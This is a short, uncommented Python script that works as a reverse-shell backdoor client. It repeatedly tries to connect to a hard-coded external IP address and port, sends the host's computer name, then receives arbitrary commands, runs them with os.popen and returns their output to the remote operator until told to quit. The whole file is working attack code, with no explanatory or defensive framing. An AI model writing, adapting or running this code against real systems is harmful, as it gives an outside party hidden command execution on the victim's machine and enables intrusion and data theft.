
import os, socket, time

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
infini = "faux"

def reconnect(very = 1):
        while very == 1:
                try:
                        client.connect(('90.0.104.235', 1200))
                        very = 0
                        time.sleep(1)
                except socket.error:
                        very = 1
reconnect()
#-----------------------------------------------------------
try:
	environ = os.environ['COMPUTERNAME']
	environ = environ.encode()
	client.send(environ)
except:
	client.send(b"client")
#-----------------------------------------------------------
while 1:
        try:
                if infini == "vrai":
                        reconnect()
                cmd = client.recv(1200)
                cmd = cmd.decode()
                if cmd == 'quit':
                	print("The connection was stopped !!!")
                	client.close()
                	break
                execution = os.popen(cmd)
                execution = execution.read()
                execution = execution.encode()
                client.send(execution)
                execution = ''
        except socket.error:
                client.send(b"Error")
                infini = "vrai"
                continue
